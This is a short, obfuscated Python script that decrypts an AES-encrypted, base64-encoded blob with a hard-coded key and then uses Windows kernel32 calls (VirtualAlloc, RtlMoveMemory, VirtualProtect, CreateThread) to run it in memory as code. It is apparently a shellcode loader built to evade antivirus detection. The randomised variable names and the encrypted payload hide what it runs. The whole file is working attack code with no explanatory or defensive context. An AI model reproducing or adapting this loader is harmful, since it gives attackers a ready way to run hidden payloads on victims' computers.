import ctypes as PMLBJvZsjH
from Crypto.Cipher import AES
import base64
sqsQxqjFdSfOH = AES.new('[^zz{Jox&eVHy2f5f{AHL3Y.lbDkrL*&', AES.MODE_CBC, 'QHWBFFGVsSxWKjah')
osxsmeN = base64.b64decode('n6awWFl4FPMq4ZFE4XOvkJL8MDJLarK8Lrk9Qrfyw7OJBShAtYUC/qMYyCZZR4RHniF5A8FIBYnmHOMw2laoWCfxrynOAPX2aRH9DXpNeke7v2TWXyNmtg6QLwT6GFit+dYrJLN6e0DywC4Xugby5K+3rv7Gzf2vk3/B1MLXbKs3OXP6vNgmXSnPms/eOTPjLYdA+htrI9Wj1SFKB7crv+RMSFdJeFXpTDZa1Iuref71oMpOewrpFU5NUiG52KV07qP5vssrIxtBIy3hYdJVtz7QrwhWN9Bk2wpdjFfzG+q12XqH7g3Cxy+g6DCxAdvmcrG+iyBZxSin6KnR6yQ4cleN/unhljkn071YVl7RBbgcziRapRV2UcvMzyFCpNhffmlFWf66JEkAxPmLV9j98YRI7YfiSx0iE0zBKFxDIDkXup18X9x/lgJzWgo2LGcpu7qduTWmmU2oiUH/6j0Svw==')
xDQiQaBQ = sqsQxqjFdSfOH.decrypt(osxsmeN)
SqnAsxRvND = PMLBJvZsjH.windll.kernel32.VirtualAlloc(PMLBJvZsjH.c_int(0),PMLBJvZsjH.c_int(len(xDQiQaBQ)),PMLBJvZsjH.c_int(0x3000),PMLBJvZsjH.c_int(0x04))
PMLBJvZsjH.windll.kernel32.RtlMoveMemory(PMLBJvZsjH.c_int(SqnAsxRvND),xDQiQaBQ,PMLBJvZsjH.c_int(len(xDQiQaBQ)))
QMCeoAzsPccdnt = PMLBJvZsjH.windll.kernel32.VirtualProtect(PMLBJvZsjH.c_int(SqnAsxRvND),PMLBJvZsjH.c_int(len(xDQiQaBQ)),PMLBJvZsjH.c_int(0x20),PMLBJvZsjH.byref(PMLBJvZsjH.c_uint32(0)))
vaKuuklWg = PMLBJvZsjH.windll.kernel32.CreateThread(PMLBJvZsjH.c_int(0),PMLBJvZsjH.c_int(0),PMLBJvZsjH.c_int(SqnAsxRvND),PMLBJvZsjH.c_int(0),PMLBJvZsjH.c_int(0),PMLBJvZsjH.pointer(PMLBJvZsjH.c_int(0)))
PMLBJvZsjH.windll.kernel32.WaitForSingleObject(PMLBJvZsjH.c_int(vaKuuklWg),PMLBJvZsjH.c_int(-1))
